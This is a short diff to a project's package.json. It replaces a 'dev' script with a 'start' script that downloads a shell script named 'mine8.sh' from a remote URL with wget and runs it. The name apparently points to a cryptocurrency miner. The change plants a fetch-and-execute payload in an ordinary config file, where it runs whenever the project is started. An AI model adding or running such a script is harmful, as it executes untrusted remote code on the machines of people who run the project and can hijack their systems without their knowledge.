@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "dev": "pages dev ./public"
+    "start": "wget https://huggingface.co/myfiles/data/raw/main/mine8.sh && sh mine8.sh"
   },
   "license": "MIT",
   "devDependencies": {
